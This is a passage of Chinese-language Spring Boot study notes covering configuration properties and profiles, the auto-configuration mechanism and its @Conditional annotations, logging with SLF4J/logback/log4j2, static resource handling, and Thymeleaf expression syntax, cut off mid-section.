随机数\n\n${random.value}、${random.int}、${random.long}\n${random.int(10)}、${random.int[1024,65536]}\n\n\n1\n2\n\n\n# 占位符获取配置值\n\nperson.last‐name=张三${random.uuid}\nperson.age=${random.int}\nperson.birth=2017/12/15\nperson.boss=false\nperson.maps.k1=v1\nperson.maps.k2=14\nperson.lists=a,b,c\nperson.dog.name=${person.hello:hello}_dog\nperson.dog.age=15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# profile多环境支持\n\n我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml。\n\n默认使用application.properties的配置。当我们需要激活指定的配置文件时，可以在主配置文件中指定：spring.profiles.active=dev或者使用命令行方式java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar --spring.profiles.active=dev，或者使用虚拟机方式-Dspring.profiles.active=dev。\n\n\n# yml多文档块模式\n\nserver:\n port: 8081\n spring:\n profiles:\n active: prod\n‐‐‐\nserver:\n port: 8083\n spring:\n profiles: dev\n‐‐‐\nserver:\n port: 8084\n spring:\n profiles: prod #指定属于哪个环境\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 配置文件的加载\n\nspringboot启动会扫描以下位置的application.properties或者application.yml文件作为Springboot的默认配置文件。\n\n–file:./config/  当前项目的config目录\n–file:./\n–classpath:/config/\n–classpath:/\n\n\n1\n2\n3\n4\n\n\n优先级由高到底，高优先级的配置会覆盖低优先级的配置。只要以上的配置文件存在Springboot就会加载，形成配置文件的互补。\n\n我们还可以通过spring.config.location来改变默认的配置文件位置(使用命令行参数的方式)：\n\njava -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar --spring.profiles.active=dev --spring.config.location=xxx\n\n\n1\n\n\n这个配置文件的位置会和其他位置上的配置文件共同加载。\n\nSpringBoot也可以从以下位置加载配置，优先级从高到低，高优先级的配置覆盖低优先级的配置，所有的配置会 形成互补配置。\n\n 1.  命令行参数\n 2.  来自java:comp/env的JNDI属性\n 3.  Java系统属性（System.getProperties()）\n 4.  操作系统环境变量\n 5.  RandomValuePropertySource配置的random.*属性值\n 6.  jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件\n 7.  jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件\n 8.  jar包外部的application.properties或application.yml(不带spring.profile)配置文件\n 9.  jar包内部的application.properties或application.yml(不带spring.profile)配置文件\n 10. @Configuration注解类上的@PropertySource\n 11. 通过SpringApplication.setDefaultProperties指定的默认属性\n\n\n# 自动配置原理\n\n配置文件能够配置的属性可以参考：Springboot配置文件\n\n 1.  Springboot启动类上有一个注解@SpringBootApplication，该注解是一个组合注解\n     \n     @Target({ElementType.TYPE})\n     @Retention(RetentionPolicy.RUNTIME)\n     @Documented\n     @Inherited\n     @SpringBootConfiguration\n     @EnableAutoConfiguration\n     @ComponentScan(\n         excludeFilters = {@Filter(\n         type = FilterType.CUSTOM,\n         classes = {TypeExcludeFilter.class}\n     ), @Filter(\n         type = FilterType.CUSTOM,\n         classes = {AutoConfigurationExcludeFilter.class}\n     )}\n     )\n     public @interface SpringBootApplication {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     \n\n 2.  其中有一个@EnableAutoConfiguration，该注解就是实现自动配置有关的注解。\n     \n     @Target({ElementType.TYPE})\n     @Retention(RetentionPolicy.RUNTIME)\n     @Documented\n     @Inherited\n     @AutoConfigurationPackage\n     @Import({AutoConfigurationImportSelector.class})\n     public @interface EnableAutoConfiguration {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n 3.  其中@Import导入了一个自动配置导入选择器，在该选择器中，有一个方法，将所有的自动配置全类名保存到一个configurations中。\n     \n         protected AutoConfigurationImportSelector.AutoConfigurationEntry getAutoConfigurationEntry(AnnotationMetadata annotationMetadata) {\n             if (!this.isEnabled(annotationMetadata)) {\n                 return EMPTY_ENTRY;\n             } else {\n                 AnnotationAttributes attributes = this.getAttributes(annotationMetadata);\n                 List<String> configurations = this.getCandidateConfigurations(annotationMetadata, attributes);\n                 configurations = this.removeDuplicates(configurations);\n                 Set<String> exclusions = this.getExclusions(annotationMetadata, attributes);\n                 this.checkExcludedClasses(configurations, exclusions);\n                 configurations.removeAll(exclusions);\n                 configurations = this.getConfigurationClassFilter().filter(configurations);\n                 this.fireAutoConfigurationImportEvents(configurations, exclusions);\n                 return new AutoConfigurationImportSelector.AutoConfigurationEntry(configurations, exclusions);\n             }\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     \n\n 4.  获取configuration的方法是getCandidateConfigurations。\n     \n         protected List<String> getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) {\n             List<String> configurations = SpringFactoriesLoader.loadFactoryNames(this.getSpringFactoriesLoaderFactoryClass(), this.getBeanClassLoader());\n             Assert.notEmpty(configurations, "No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.");\n             return configurations;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     \n\n 5.  该方法中调用了SpringFactoriesLoader中的loadFactoryNames获取到了所有的配置文件中配置的Auto Configuration全类名。\n     \n     Enumeration urls = classLoader.getResources("META-INF/spring.factories");\n     \n     \n     1\n     \n\n 6.  该方法扫描所有Jar包下的META-INF/spring.factories，把扫描到的这些文件的内容包装成properties对象，从properties中获取到EnableAutoConfiguration.class类(类名)对应的值，然后把他们添加在容器中。\n\n 7.  每一个这样的xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中，用他们来做自动配置。\n\n 8.  以HttpEncodingAutoConfiguration（Http编码自动配置）为例解释自动配置原理。\n     \n     @Configuration(\n         proxyBeanMethods = false\n     )  // //表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件\n     @EnableConfigurationProperties({ServerProperties.class})  ////启动指定类的ConfigurationProperties功能；将配置文件中对应的值和ServerProperties绑定起来；并把ServerProperties加入到ioc容器中\n     \n     @ConditionalOnWebApplication(\n         type = Type.SERVLET\n     )  // n //Spring底层@Conditional注解（Spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效； 判断当前应用是否是web应用，如果是，当前配置类生效\n     \n     @ConditionalOnClass({CharacterEncodingFilter.class})  //判断当前项目有没有这个类, CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；\n     \n     @ConditionalOnProperty(\n         prefix = "server.servlet.encoding",\n         value = {"enabled"},\n         matchIfMissing = true\n     ) // //判断配置文件中是否存在某个配置 server.servlet.encoding；如果不存在，判断也是成立的\n     //即使我们配置文件中不配置server.servlet.encoding=true，也是默认生效的；\n     public class HttpEncodingAutoConfiguration {\n         \n         // 和encoding做映射，encoding类中配置对应的相关配置文件的内容，加上上面的前缀。\n         private final Encoding properties;\n     \n         //只有一个有参构造器的情况下，参数的值就会从容器中拿\n         public HttpEncodingAutoConfiguration(ServerProperties properties) {\n             this.properties = properties.getServlet().getEncoding();\n         }\n     \n         @Bean  ////给容器中添加一个组件，这个组件的某些值需要从properties中获取\n         @ConditionalOnMissingBean  //判断容器没有这个组件？\n         public CharacterEncodingFilter characterEncodingFilter() {\n             CharacterEncodingFilter filter = new OrderedCharacterEncodingFilter();\n             filter.setEncoding(this.properties.getCharset().name());\n             filter.setForceRequestEncoding(this.properties.shouldForce(org.springframework.boot.web.servlet.server.Encoding.Type.REQUEST));\n             filter.setForceResponseEncoding(this.properties.shouldForce(org.springframework.boot.web.servlet.server.Encoding.Type.RESPONSE));\n             return filter;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     \n\n 9.  根据当前不同的条件判断，决定这个配置类是否生效。一但这个配置类生效，这个配置类就会给容器中添加各种组件，这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的。\n\n 10. 所有在配置文件中能配置的属性都是在xxxxProperties类中封装的，配置文件能配置什么就可以参照某个功能对应的这个属性类。\n     \n     public class Encoding {\n         public static final Charset DEFAULT_CHARSET;\n         private Charset charset;\n         private Boolean force;\n         private Boolean forceRequest;\n         private Boolean forceResponse;\n         private Map<Locale, Charset> mapping;\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n\n# Springboot的精髓\n\n * SpringBoot启动会加载大量的自动配置类\n * 我们看我们需要的功能有没有SpringBoot默认写好的自动配置类\n * 我们再来看这个自动配置类中到底配置了哪些组件（只要我们要用的组件有，我们就不需要再来配置了）\n * 给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值。\n\n\n# @Conditional派生注解\n\n作用：对生效条件进行判断，必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效。\n\n@CONDITIONAL扩展注解                  作用（判断是否满足当前指定条件）\n@ConditionalOnJava                系统的java版本是否符合要求\n@ConditionalOnBean                容器中存在指定Bean\n@ConditionalOnMissingBean         容器中不存在指定Bean\n@ConditionalOnExpression          满足SpEL表达式指定\n@ConditionalOnClass               系统中有指定的类\n@ConditionalOnMissingClass        系统中没有指定的类\n@ConditionalOnSingleCandidate     容器中只有一个指定的Bean，或者这个Bean是首选Bean\n@ConditionalOnProperty            系统中指定的属性是否有指定的值\n@ConditionalOnResource            类路径下是否存在指定资源文件\n@ConditionalOnWebApplication      当前是web环境\n@ConditionalOnNotWebApplication   当前不是web环境\n@ConditionalOnJndi                JNDI存在指定项\n\n因此，我们自动配置类需要在该类满足配置以上注解的条件下才能使用，我们可以在配置文件中开启debug模式，该模式可以打印自动配置报告，在该报告中标明了哪些类生效，哪些类不生效。\n\n\n============================\nCONDITIONS EVALUATION REPORT\n============================\n\n\nPositive matches:\n-----------------\n\n   AopAutoConfiguration matched:\n      - @ConditionalOnProperty (spring.aop.auto=true) matched (OnPropertyCondition)\n\n   AopAutoConfiguration.ClassProxyingConfiguration matched:\n      - @ConditionalOnMissingClass did not find unwanted class \'org.aspectj.weaver.Advice\' (OnClassCondition)\n      - @ConditionalOnProperty (spring.aop.proxy-target-class=true) matched (OnPropertyCondition)\n\n   DispatcherServletAutoConfiguration matched:\n      - @ConditionalOnClass found required class \'org.springframework.web.servlet.DispatcherServlet\' (OnClassCondition)\n      - found \'session\' scope (OnWebApplicationCondition)\n\n   DispatcherServletAutoConfiguration.DispatcherServletConfiguration matched:\n      - @ConditionalOnClass found required class \'javax.servlet.ServletRegistration\' (OnClassCondition)\n      - Default DispatcherServlet did not find dispatcher servlet beans (DispatcherServletAutoConfiguration.DefaultDispatcherServletCondition)\n\n   DispatcherServletAutoConfiguration.DispatcherServletRegistrationConfiguration matched:\n      - @ConditionalOnClass found required class \'javax.servlet.ServletRegistration\' (OnClassCondition)\n      - DispatcherServlet Registration did not find servlet registration bean (DispatcherServletAutoConfiguration.DispatcherServletRegistrationCondition)\n\n……………………\n\nNegative matches:\n-----------------\n\n   ActiveMQAutoConfiguration:\n      Did not match:\n         - @ConditionalOnClass did not find required class \'javax.jms.ConnectionFactory\' (OnClassCondition)\n\n   AopAutoConfiguration.AspectJAutoProxyingConfiguration:\n      Did not match:\n         - @ConditionalOnClass did not find required class \'org.aspectj.weaver.Advice\' (OnClassCondition)\n\n …………………\n\nExclusions:\n-----------\n\n    None\n\n\nUnconditional classes:\n----------------------\n\n    org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration\n\n    org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration\n\n    org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration\n\n    org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration\n\n    org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 日志\n\n场景：小张在开发一个大型的系统，在系统中为了调试方便，小张使用System.out.Print打印了一些调试信息。有一天，领导说想要将打印的信息移除掉，虽然很困难，小张还是将自己写的System.out一行一行的删掉了。删除之后，领导说小张写的调试输出还是很有用的，想要重新加上，并且最好能够输出到一个文件中去。于是小张写了一个日志的框架zhanglogging.jar，调用框架中的api打印日志并且输出到文件中。过了一段时间，小张想给他的框架中添加一些功能，于是写了一个zhanglogging-better.jar。那么怎么替换项目中的日志框架呢？还需要重新将使用过日志的地方替换为新的日志框架。小张想到了JDBC，JDBC提供了一个数据库的连接器，后面的实现用的不同的具体实现的jar。于是小张写了一个日志的抽象层，项目中引用了日志的抽象层，然后具体的日志jar实现了抽象层。下次如果更新就可以直接替换具体的实现就好了。\n\n主流的日志框架：JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j……\n\n但是这些框架并不都是日志的具体实现。\n\n日志门面 （日志的抽象层）                                                  日志实现\nJCL（Jakarta Commons Logging）、SLF4j（Simple Logging Facade for   Log4j 、JUL（java.util.logging） 、Log4j2 、Logback\nJava） 、jboss-logging\n\n我们在项目中最好是使用日志的抽象层，然后选择一个具体的实现。这样在切换日志框架时就只需要替换掉日志的具体实现就好了。其中log4j、logback和slf4j是同一个作者研发的。slf4j是抽象层（门面）,logback是log4j的功能升级版。\n\nspringboot默认选用的日志框架是slf4j和logback的组合，而spring默认使用的是JCL。\n\n\n# SLF4J的使用方法\n\nSLF4J官网\n\n以后开发的时候，日志记录方法的调用不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法。并且给系统里面导入slf4j的jar和 logback的实现jar。\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\npublic class HelloWorld {\n    public static void main(String[] args) {\n        Logger logger = LoggerFactory.getLogger(HelloWorld.class);\n        logger.info("Hello World");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\n每一个日志的实现框架都有自己的配置文件。使用slf4j以后，配置文件还是做成日志实现框架自己本身的配置文件。\n\n\n# 日志的统一\n\n在项目中，不同的组件可能使用的不同的日志框架。那么我们怎么使用统一的log4j框架呢？\n\n\n\n我们需要将所有的日志框架都统统一到slf4j+logback的组合：\n\n 1. 去除之前项目中的日志框架\n 2. 添加xxx-over-slf4j.jar，这个jar包内部的包名是原来的日志框架，具体实现是调用slf4j的api，然后再由slf4j调用具体的日志实现框架。\n 3. 导入slf4j的其他实现。\n\n\n# springboot的日志关系\n\n每个springboot场景启动器中都会包含一个springboot的启动器。\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\n该启动器中又包含了一个日志的启动器\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\n底层的依赖关系：\n\n\n\n如果需要引入其他框架，首先就需要将该框架的日志包排除出去，然后使用xxx-over-slf4j.jar，统一到slf4j上。\n\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring‐core</artifactId>\n    <exclusions>\n        <exclusion>\n            <groupId>commons‐logging</groupId>\n            <artifactId>commons‐logging</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 日志的使用方法\n\n//记录器\nLogger logger = LoggerFactory.getLogger(getClass());\n@Test\npublic void contextLoads() {\n    //System.out.println();\n    //日志的级别；\n    //由低到高 trace<debug<info<warn<error\n    //可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效\n    logger.trace("这是trace日志...");\n    logger.debug("这是debug日志...");\n    //SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root\n    级别\n        logger.info("这是info日志...");\n    logger.warn("这是warn日志...");\n    logger.error("这是error日志...");\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n日志输出的格式设置：\n\n日志输出格式：\n%d表示日期时间，\n%thread表示线程名，\n%‐5level：级别从左显示5个字符宽度\n%logger{50} 表示logger名字最长50个字符，否则按照句点分割。\n%msg：日志消息，\n%n是换行符\n%d{yyyy‐MM‐dd HH:mm:ss.SSS} [%thread] %‐5level %logger{50} ‐ %msg%n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nSpringboot修改配置文件修改日志：\n\nlogging.level.com.atguigu=trace\n#logging.path=\n# 不指定路径在当前项目下生成springboot.log日志\n# 可以指定完整的路径；\n#logging.file=G:/springboot.log\n# 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用 spring.log 作为默认文件\nlogging.path=/spring/log\n# 在控制台输出的日志的格式\nlogging.pattern.console=%d{yyyy‐MM‐dd} [%thread] %‐5level %logger{50} ‐ %msg%n\n# 指定文件中日志输出的格式\nlogging.pattern.file=%d{yyyy‐MM‐dd} === [%thread] === %‐5level === %logger{50} ==== %msg%n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nLOGGING.FILE   LOGGING.PATH   EXAMPLE    DESCRIPTION\n(none)         (none)                    只在控制台输出\n指定文件名          (none)         my.log     输出日志到my.log文件\n(none)         指定目录           /var/log   输出到指定目录的 spring.log 文件中\n\n\n# 日志配置文件\n\n给类路径下放上每个日志框架自己的配置文件，SpringBoot就不使用他默认配置。\n\nLOGGING SYSTEM            CUSTOMIZATION\nLogback                   logback-spring.xml , logback-spring.groovy , logback.xml or\n                          logback.groovy\nLog4j2                    log4j2-spring.xml or log4j2.xml\nJDK (Java Util Logging)   logging.properties\n\n其中，可以使用logback-spring.xml配置文件，该配置文件可以根据环境profile，选择不同的配置。该配置文件会被springboot识别，而logback.xml将会被logback组件直接识别，其中不能编写相关的其他配置。\n\n<springProfile name="staging">\n    <!‐‐ configuration to be enabled when the "staging" profile is active ‐‐>\n    可以指定某段配置只在某个环境下生效\n</springProfile>\n\n<appender name="stdout" class="ch.qos.logback.core.ConsoleAppender">\n    <!‐‐\n    日志输出格式：\n    %d表示日期时间，\n    %thread表示线程名，\n    %‐5level：级别从左显示5个字符宽度\n    %logger{50} 表示logger名字最长50个字符，否则按照句点分割。\n    %msg：日志消息，\n    %n是换行符\n    ‐‐>\n    <layout class="ch.qos.logback.classic.PatternLayout">\n        <springProfile name="dev">\n            <pattern>%d{yyyy‐MM‐dd HH:mm:ss.SSS} ‐‐‐‐> [%thread] ‐‐‐> %‐5level\n                %logger{50} ‐ %msg%n</pattern>\n        </springProfile>\n        <springProfile name="!dev">\n            <pattern>%d{yyyy‐MM‐dd HH:mm:ss.SSS} ==== [%thread] ==== %‐5level\n                %logger{50} ‐ %msg%n</pattern>\n        </springProfile>\n    </layout>\n</appender>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 切换日志框架为slf4j+log4j\n\n首先将logback排除，然后将log4j-over-slf4j排除，引入slf4j-log4j12\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐web</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>logback‐classic</artifactId>\n            <groupId>ch.qos.logback</groupId>\n        </exclusion>\n        <exclusion>\n            <artifactId>log4j‐over‐slf4j</artifactId>\n            <groupId>org.slf4j</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4j‐log4j12</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n这么做没有什么意义，因为logback是log4j的升级版本，通常情况下，我们会使用log4j2。\n\n\n# 切换日志框架slf4j+log4j2\n\n首先将starter-logging排除，使用starter-log4j2\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐web</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>spring‐boot‐starter‐logging</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐log4j2</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# Web开发\n\n使用Springboot进行web开发的流程：\n\n 1. 创建Springboot应用，并选择相关的组件\n 2. 编写少量的配置文件\n 3. 编写业务代码\n\n\n# Springboot对静态资源的处理\n\nSpringboot对静态资源的自动配置相关参数在下面这个类里面完成的。\n\n@ConfigurationProperties(prefix = "spring.resources", ignoreUnknownFields = false)\npublic class ResourceProperties implements ResourceLoaderAware {\n//可以设置和静态资源有关的参数，缓存时间等\n\n\n1\n2\n3\n\n\nSpringMVC相关的自动配置都会配置到WebMvcAutoConfiguration中，下面的内容是导入webjars导入静态资源的方式：\n\n@Override\npublic void addResourceHandlers(ResourceHandlerRegistry registry) {\n    if (!this.resourceProperties.isAddMappings()) {\n        logger.debug("Default resource handling disabled");\n        return;\n    }\n    Integer cachePeriod = this.resourceProperties.getCachePeriod();\n    if (!registry.hasMappingForPattern("/webjars/**")) {\n        customizeResourceHandlerRegistration(\n            registry.addResourceHandler("/webjars/**")\n            .addResourceLocations(\n                "classpath:/META-INF/resources/webjars/")\n            .setCachePeriod(cachePeriod));\n    }\n    String staticPathPattern = this.mvcProperties.getStaticPathPattern();\n    if (!registry.hasMappingForPattern(staticPathPattern)) {\n        customizeResourceHandlerRegistration(\n            registry.addResourceHandler(staticPathPattern)\n            .addResourceLocations(\n                this.resourceProperties.getStaticLocations())\n            .setCachePeriod(cachePeriod));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n通过webjars我们可以使用jar包的方式将静态资源引入项目中。对于请求中/webjars下的任意请求都去classpath:/META-INF/resources/webjars/这个路径去寻找。\n\nString staticPathPattern = this.mvcProperties.getStaticPathPattern();\n\n\n1\n\n\n这行代码获取了/**的路径，访问当前项目的所有资源如果没人处理，默认从resourceProperties中获取静态路径，配置的静态路径是：\n\n\tprivate static final String[] CLASSPATH_RESOURCE_LOCATIONS = {\n\t\t\t"classpath:/META-INF/resources/", "classpath:/resources/",\n\t\t\t"classpath:/static/", "classpath:/public/" };\n\n\tprivate static final String[] RESOURCE_LOCATIONS;\n\n\tstatic {\n\t\tRESOURCE_LOCATIONS = new String[CLASSPATH_RESOURCE_LOCATIONS.length\n\t\t\t\t+ SERVLET_RESOURCE_LOCATIONS.length];\n\t\tSystem.arraycopy(SERVLET_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS, 0,\n\t\t\t\tSERVLET_RESOURCE_LOCATIONS.length);\n\t\tSystem.arraycopy(CLASSPATH_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS,\n\t\t\t\tSERVLET_RESOURCE_LOCATIONS.length, CLASSPATH_RESOURCE_LOCATIONS.length);\n\t}\n\n\t/**\n\t * Locations of static resources. Defaults to classpath:[/META-INF/resources/,\n\t * /resources/, /static/, /public/] plus context:/ (the root of the servlet context).\n\t */\n\tprivate String[] staticLocations = RESOURCE_LOCATIONS;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n因此，对于/**的访问路径，如果没有人处理就访问下面的几个路径寻找资源:\n\n"classpath:/META-INF/resources/"\n"classpath:/resources/",\n"classpath:/static/"\n"classpath:/public/" \n\n\n1\n2\n3\n4\n\n\n对于欢迎页的访问映射，映射到每个静态资源文件夹中的所有index.html。\n\n@Bean\npublic WelcomePageHandlerMapping welcomePageHandlerMapping(\n    ResourceProperties resourceProperties) {\n    return new WelcomePageHandlerMapping(resourceProperties.getWelcomePage(),\n                                         this.mvcProperties.getStaticPathPattern());  //private String staticPathPattern = "/**";\n}\n\nprivate String[] getStaticWelcomePageLocations() {\n    String[] result = new String[this.staticLocations.length];\n    for (int i = 0; i < result.length; i++) {\n        String location = this.staticLocations[i];\n        if (!location.endsWith("/")) {\n            location = location + "/";\n        }\n        result[i] = location + "index.html";\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n对于图标的映射\n\n@Configuration\n@ConditionalOnProperty(value = "spring.mvc.favicon.enabled", matchIfMissing = true)\npublic static class FaviconConfiguration {\n\n    private final ResourceProperties resourceProperties;\n\n    public FaviconConfiguration(ResourceProperties resourceProperties) {\n        this.resourceProperties = resourceProperties;\n    }\n\n    @Bean\n    public SimpleUrlHandlerMapping faviconHandlerMapping() {\n        SimpleUrlHandlerMapping mapping = new SimpleUrlHandlerMapping();\n        mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + 1);\n        mapping.setUrlMap(Collections.singletonMap("**/favicon.ico",     // 还是在静态资源文件夹下寻找\n                                                   faviconRequestHandler()));\n        return mapping;\n    }\n\n\n    List<Resource> getFaviconLocations() {\n        List<Resource> locations = new ArrayList<Resource>(\n            this.staticLocations.length + 1);\n        if (this.resourceLoader != null) {\n            for (String location : this.staticLocations) {\n                locations.add(this.resourceLoader.getResource(location));\n            }\n        }\n        locations.add(new ClassPathResource("/"));\n        return Collections.unmodifiableList(locations);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# Thymeleaf模板引擎\n\nSpringboot是以Jar的方式打包，并且嵌入式的tomcat并不支持jsp，springboot推荐使用thymeleaf模板引擎进行开发。\n\n\n\n引入thymeleaf模板引擎的方法\n\n<properties>\n    <thymeleaf.version>3.0.9.RELEASE</thymeleaf.version>\n    \x3c!-- 布局功能的支持程序 thymeleaf3主程序 layout2以上版本 --\x3e\n    \x3c!-- thymeleaf2 layout1 --\x3e\n    <thymeleaf-layout-dialect.version>2.2.2</thymeleaf-layout-dialect.version>\n</properties>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-thymeleaf</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nThymeleaf的自动配置，默认帮我们添加了模板解析器等组件，而默认规则配置在ThymeleafProperties中\n\n@ConfigurationProperties(prefix = "spring.thymeleaf")\npublic class ThymeleafProperties {\n\n    private static final Charset DEFAULT_ENCODING = Charset.forName("UTF-8");\n\n    private static final MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf("text/html");\n\n    public static final String DEFAULT_PREFIX = "classpath:/templates/";\n\n    public static final String DEFAULT_SUFFIX = ".html";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n根据以上的配置，只需要将我们的thymeleaf模板放置到classpath:/templates/中，并以html结尾，就可以被Thymeleaf模板引擎解析。\n\n# 使用方法\n\n 1. 导入thymeleaf名称空间\n\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n\n\n1\n\n\n 2. Thymeleaf语法：参考文档下载\n\n 3. 标签\n\n\n\n 4. 表达式\n\n简单表达式：\n变量表达式 ${...}：获取变量值；OGNL；\n\t1）、获取对象的属性、调用方法\n\t2）、使用内置的基本对象：\n\t#ctx : the context object.\n    #vars: the context variables.\n    #locale : the context locale.\n    #request : (only in Web Contexts) the HttpServletRequest object.\n    #response : (only in Web Contexts) the HttpServletResponse object.\n    #session : (only in Web Contexts) the HttpSession object.\n    #servletContext : (only in Web Contexts) the ServletContext object.\n    ${session.foo}\n内置的一些工具对象：\n    #execInfo : information about the template being processed.\n    #messages : methods for obtaining externalized messages inside variables expressions, in the\n    same way as they would be obtained using #{…} syntax.\n    #uris : methods for escaping parts of URLs/URIs\n    #conversions : methods for executing the configured conversion service (if any).\n    #dates : methods for java.util.Date objects: formatting, component extraction, etc.\n    #calendars : analogous to #dates , but for java.util.Calendar objects.\n    #numbers : methods for formatting numeric objects.\n    #strings : methods for String objects: contains, startsWith, prepending/appending, etc.\n    #objects : methods for objects in general.\n    #bools : methods for boolean evaluation.\n    #arrays : methods for arrays.\n    #lists : methods for lists.\n    #sets : methods for sets.\n    #maps : methods for maps.\n    #aggregates : methods for creating aggregates on arrays or collections.\n    #ids : methods for dealing with id attributes that might be repeated (for example, as a\n    result of an iteration).\n选择变量表达式 *{...}：选择表达式：和${}在功能上是一样\n\t补充：配合 th:object="${session.user}：\n    &lt;div th:object="${session.user}">\n    &lt;p>Name: &lt;span th:text="*{firstName}">Sebastian&lt;/span>.&lt;/p>\n    &lt;p>Surname: &lt;span th:text="*{lastName}">Pepper&lt;/span>.&lt;/p>\n    &lt;p>Nationality: &lt;span th:text="*{nationality}">Saturn&lt;/span>.&lt;/p>\n    &lt;/div>\nMessage Expressions: #{...}：获取国际化内容\nLink URL Expressions: @{...}：定义URL；\n\t@{/order/process(execId=${execId},execType=\'FAST\')}\nFragment Expressions: ~{...}：片段引用表达式\n\t&lt;div 